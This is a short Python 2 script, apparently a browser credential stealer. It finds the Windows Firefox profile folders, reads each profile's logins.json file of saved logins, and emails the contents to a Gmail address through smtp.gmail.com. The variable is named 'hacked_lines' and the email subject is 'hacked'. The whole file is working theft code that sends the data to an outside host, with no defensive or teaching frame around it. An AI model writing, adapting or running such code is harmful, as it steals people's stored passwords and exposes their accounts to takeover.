__author__ = 'Shantanu Khandelwal'
import os
import re
import subprocess

def runProcess(exe):
    p = subprocess.Popen(exe, stdout=subprocess.PIPE, stderr=subprocess.STDOUT , shell=True)
    while(True):
      retcode = p.poll() #returns None while subprocess is running
      line = p.stdout.readline()
      yield line
      if retcode is not None :
        break

def send_email(user, pwd, recipient, subject, body):
    import smtplib

    gmail_user = user
    gmail_pwd = pwd
    FROM = user
    TO = recipient if type(recipient) is list else [recipient]
    SUBJECT = subject
    TEXT = body

    # Prepare actual message
    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s
    """ % (FROM, ", ".join(TO), SUBJECT, TEXT)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(gmail_user, gmail_pwd)
        server.sendmail(FROM, TO, message)
        server.close()
        print 'successfully sent the mail'
    except:
        print "failed to send mail"



b = None
for line in runProcess("""%APPDATA%\Mozilla\Firefox\Profiles\  """.split()):
    a = re.findall("\'(.+)\' is not recognized as an internal or external command",line)
    if a:
        b=a[0]

hacked_lines = []
for item in os.listdir(b):
    try:
        fhan = open(os.path.join(b,item,"logins.json"),'r')
        hacked_lines.append(fhan.readlines())
        fhan.close()
    except Exception,msg:
        print msg


send_email("shantanu561993@gmail.com","password","aishvarya.dave@gmail.com","hacked",hacked_lines)